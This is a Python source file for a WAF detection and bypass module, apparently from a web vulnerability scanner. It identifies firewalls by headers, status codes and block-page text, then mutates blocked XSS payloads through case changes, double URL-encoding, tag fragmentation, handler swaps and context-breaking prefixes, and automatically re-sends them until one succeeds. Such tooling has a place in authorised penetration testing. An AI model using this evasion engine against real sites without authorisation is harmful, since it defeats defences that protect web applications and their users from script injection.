"""WAF/AV detection and bypass payload generation."""

from __future__ import annotations

import random
from html import escape
from pathlib import Path
from urllib.parse import quote


def _load_bypass_library() -> list[str]:
    """Load built-in bypass payload library from data file."""
    data_file = Path(__file__).resolve().parent.parent / "data" / "bypass_payloads.txt"
    if not data_file.exists():
        return []

    payloads: list[str] = []
    for raw in data_file.read_text(encoding="utf-8", errors="ignore").splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        payloads.append(line)
    return payloads


class WAFDetector:
    """Detect WAF/AV style blocking and generate broad bypass strategies."""

    SECURITY_HEADERS = {
        "x-sucuri-id",
        "x-sucuri-cache",
        "x-firewall",
        "cf-ray",
        "x-cdn",
        "x-waf",
        "x-akamai",
        "x-ddos-protection",
        "x-imperva-id",
        "x-mod-security",
        "server",
    }

    SECURITY_BODY_PATTERNS = [
        "access denied",
        "request blocked",
        "forbidden",
        "malicious",
        "web application firewall",
        "incident id",
        "security rule",
        "attack detected",
        "threat detected",
        "virus detected",
        "bot detected",
        "automated query",
        "captcha",
        "mod_security",
        "cloudflare",
        "imperva",
    ]


    def __init__(self, engine) -> None:
        self.engine = engine

    def detect(self) -> bool:
        blocked_signals = 0
        security_header_hits = 0
        total = max(len(self.engine.response_log), 1)

        for entry in self.engine.response_log:
            status_code = entry.get("status_code", 0)
            headers = {str(k).lower(): str(v).lower() for k, v in entry.get("headers", {}).items()}
            body = str(entry.get("body", "")).lower()

            if status_code in {401, 403, 406, 409, 418, 429, 451, 500, 503}:
                blocked_signals += 1

            if any(key in headers for key in self.SECURITY_HEADERS):
                security_header_hits += 1

            if any(pattern in body for pattern in self.SECURITY_BODY_PATTERNS):
                blocked_signals += 1

        return blocked_signals >= max(3, int(total * 0.2)) or security_header_hits > 0

    def _case_mutation(self, payload: str) -> list[str]:
        variants = [payload]
        if "script" in payload.lower():
            variants.extend(
                [
                    payload.replace("script", "Script"),
                    payload.replace("script", "sCrIpT"),
                    payload.replace("script", "SCRipt"),
                ]
            )
        return variants

    def _encoding_mutation(self, payload: str) -> list[str]:
        return [
            quote(payload, safe=""),
            quote(quote(payload, safe=""), safe=""),
            escape(payload),
            payload.replace("<", "%3c").replace(">", "%3e"),
            payload.replace("<", "&lt;").replace(">", "&gt;"),
        ]

    def _fragmentation_mutation(self, payload: str) -> list[str]:
        variants = [
            payload.replace("<script", "<scr<script>ipt"),
            payload.replace("alert", "al" + "ert"),
            payload.replace("onerror", "oneonerrorrror"),
            payload + "<!--waf-bypass-->",
            payload + "/*x*/",
            f"{payload}aaa",
        ]
        return variants

    def _handler_mutation(self, payload: str) -> list[str]:
        replaced = []
        for source, target in [
            ("onerror", "onload"),
            ("onerror", "onmouseover"),
            ("alert", "confirm"),
            ("alert", "prompt"),
        ]:
            if source in payload:
                replaced.append(payload.replace(source, target))
        return replaced

    def _prefix_suffix_mutation(self, payload: str) -> list[str]:
        return [
            f"\"{payload}",
            f"'{payload}",
            f"\">{payload}",
            f"-->{payload}",
            f"</title>{payload}",
            f"</textarea>{payload}",
            f"</style>{payload}",
        ]

    def generate_bypass_payloads(self, original_payload: str) -> list[str]:
        """Create systematic bypass variants from original payload."""
        variants: set[str] = set()

        mutation_groups = [
            self._case_mutation(original_payload),
            self._encoding_mutation(original_payload),
            self._fragmentation_mutation(original_payload),
            self._handler_mutation(original_payload),
            self._prefix_suffix_mutation(original_payload),
            _load_bypass_library(),
        ]

        for group in mutation_groups:
            for item in group:
                if item and len(item) < 2500:
                    variants.add(item)

        variant_list = list(variants)
        random.shuffle(variant_list)
        return variant_list

    def run_bypass(self) -> list[dict]:
        """Re-run blocked payloads with bypass techniques and return confirmations."""
        bypass_confirmations: list[dict] = []

        for payload in list(self.engine.blocked_payloads):
            candidates = self.generate_bypass_payloads(payload)
            for candidate in candidates:
                result = self.engine.test_payload(candidate, bypass_mode=True)
                if result and result.get("confirmed"):
                    bypass_confirmations.append(result)
                    break

        return bypass_confirmations
